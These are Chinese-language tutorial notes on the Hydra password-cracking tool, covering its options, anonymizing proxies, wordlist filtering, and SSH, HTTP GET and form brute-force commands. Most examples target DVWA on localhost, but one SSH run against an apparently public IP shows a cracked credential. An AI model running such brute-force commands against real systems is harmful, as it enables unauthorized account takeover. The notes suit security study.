# Hydra

> 可以使用带有GUI的xhydra
>
> 常用
>
> ```
> hydra -L username.txt -P passwd.txt -o output.txt -e nrs IP service
> ```
>
> 

## 概述

hydra是一个多线程支持多种协议的密码破解工具

pattern：`hydra [option] target service`

如果target是IPV6或CIDR形式的使用`[]`

```
hydra -l root -p 12345 ftp://[192.168.0.0/24]
```

也可以通过`-M target_file`指定存储target的文件来并行攻击。文件格式如下

```
foo.bar.com
target.com:21
unusual.port.com:2121
default.used.here.com
127.0.0.1
127.0.0.1:2121
```

service一般就是schema

## 参数

- `-S`

  目标连接需要通过SSL

- `-s port`

  如果目标服务的端口不是使用默认的，需要通过该参数指定

- `-l login | -L File`

  指定登入的用户名，大写表示读入文件

- `-p pass | -P  File`

  指定登入的密码，大写表示读入文件

- `-x min:max:charset`

  指定生成的密码使用的集合，`a`表示所有小写字母，`A`表示所有大写字母，`1`表示所有数字，其他特殊字符直接使用

  ```
  1:2:a1%.
  ```

  生成的密码最小长度为1，最大长度为2，包含所有小写字母、数字、`%`和`.`

- `-y`

  不是用`-x`参数的标志

- `-e nsr`

  该怎么使用密码

  1. n表示使用空密码
  2. s表示使用账号做为密码
  3. r表示使用逆向用户名做为密码

- `-C file`

  文件中使用`login:pass`的格式替代`-L`和`-P`参数

- `-u`

  hydra默认一次login一对多password，然后选择下一个login（loop login）。使用该参数表示password一对多login（loop password）

- `-U <service-name>`

  参考service额外需要的参数

- `-f`

  找到一对密码对后退出，需要与`-M`参数一起使用

- `-F`

  找到任意主机的一对密码对后退出，需要与`-M`参数一起使用

- `-M FIle`

  并行攻击一行一条

- `-o file`

  将输出的内容持久化到文件，代替stdout

- `-b format`

  指定`-o`输出的格式，可以使用text，json，jsonv1，默认使用text

- `-t tasknum`

  并行运行任务，默认16个进程

- `-m`

  模块参数，使用`-U <module>`参看

- `-w time`

  指定最大响应时间

- `-W time`

  指定每一次连接的最长等待时间

- `-c time`

  指定所有线程每次登入尝试的最长时间，只再任务数较少的情况下才有意义(`-t 1`)

- `-v`

  verbose mode，再每次登入尝试中显示密码和用户名

## 使用代理扫描

https://github.com/vanhauser-thc/thc-hydra#how-to-scancrack-over-a-proxy

```
HYDRA_PROXY=connect://proxy.anonymizer.com:8000
HYDRA_PROXY=socks4://auth:pw@127.0.0.1:1080
HYDRA_PROXY=socksproxylist.tx
```

## 使用小技巧

- 使用`-u`参数默写情况能

- 使用`uniq`命令对字典去重，==注意uniq只会对相邻的两行判断去重，所有要用sort==

  ```
   cat words.txt | sort | uniq > dictionary.txt
  ```


- 如果在知道密码的长度的情况下，可以通过`pw-inspector`组件来过滤密码

  1. `-i <filename>`

     从指定的文件中读取password，可以使用重定向将文件的内容到输入到stdin

  2. `-m <minlen>`

     指定密码的最短长度

  3. `-M <maxlen>`

     指定密码的最长度

  4. `-c <MINSETS_NUM>`

     指明使用sets的种类个数，默认使用所有类型的sets

  SETS

  1. `-l`

     密码必须有小写字母

  2. `-u`

     密码必须有大写字母

  3. `-n`

     密码必须有数字

  4. `-p`

     printable characters (which are not -l/-n/-p, e.g. $,!,/,(,*, etc.)

  5. `-s`

     pecial characters - all others not withint the sets above
  
  如果pw-inspector返回值为0，表示没有匹配的passwd
  
  ```
  cat dictionary.txt | pw-inspector -m 6 -c 2 -n > passlist.txt
  ```

## ssh爆破

```
#查看ssh service是否需要额外的参数
root in /opt λ hydra -U ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-23 20:33:19

Help for module ssh:
============================================================================
The Module ssh does not need or support optional parameters

root in /opt λ hydra  -l cpt -P Blasting_dictionary-master/3389爆破字典.txt 8.147.0.181 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-23 19:15:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 258 login tries (l:1/p:258), ~17 tries per task
[DATA] attacking ssh://8.135.0.171:22/
[22][ssh] host: 8.147.0.181   login: cpt   password: 1@3.c@m
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-23 19:16:03

```

## http爆破

如果需要真正使用`:`使用`\:`，如果访问的url是默认页面，需要指定默认页面

### get

```
For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

使用dvwa测试

```
root in /opt λhydra -l admin -p Blasting_dictionary-master/3389爆破字典.txt 127.0.0.1 http-get "/dvwa/vulnerabilities/brute:username=admindfaf&password=password&Login=Login :Username and/or password incorrect."
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-23 21:00:41
[DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking http-get://localhost:80/dvwa/vulnerabilities/brute:username=admindfaf&password=password&Login=Login :Username and/or password incorrect.

```



### post

需要指定模块，通过`hydra -U http-form-post`查看具体使用方法

syntax：`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

1. url 被爆破的uri，不带有schema

2. form parameters使用占位符自动使用Base64编码，username：`^USER^`，password：`^PASS^`

3. conditoin string用来校验登入是否成功的字段(放入可能是登入校验失败的字段)。登入校验失败字段可以是`F=`，但是登入校验成功字段必须以`S=`开头

4. 可选参数

   `H|h` 修改请求头

   - H

     会替换请求头中的参数如果原来的请求头中有对应key

   - h

     加在请求的最后

example:

```
"/login.php:user=^USER^&pass=^PASS^:incorrect"
 "/login.php:user=^USER64^&pass=^PASS64^&colon=colon\:escape:S=authlog=.*success"
 "/login.php:user=^USER^&pass=^PASS^&mid=123:authlog=.*failed"
 "/:user=^USER&pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^:H=User-Agent\: wget"
 "/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F<target>%2Fexchange&flags=0&username=<domain>%5C^USER^&password=^PASS^&SubmitCreds=x&trusted=0:reason=:C=/exchweb"
```

```
hydra -l admin -p password localhost http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Location\:index.php"
```

```
root in /opt λhydra -l admin -P  Blasting_dictionary-master/3389爆破字典.txt  localhost http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&user_token=02f5d9d2aaf7141635744753efa7f04d:S=index"
```











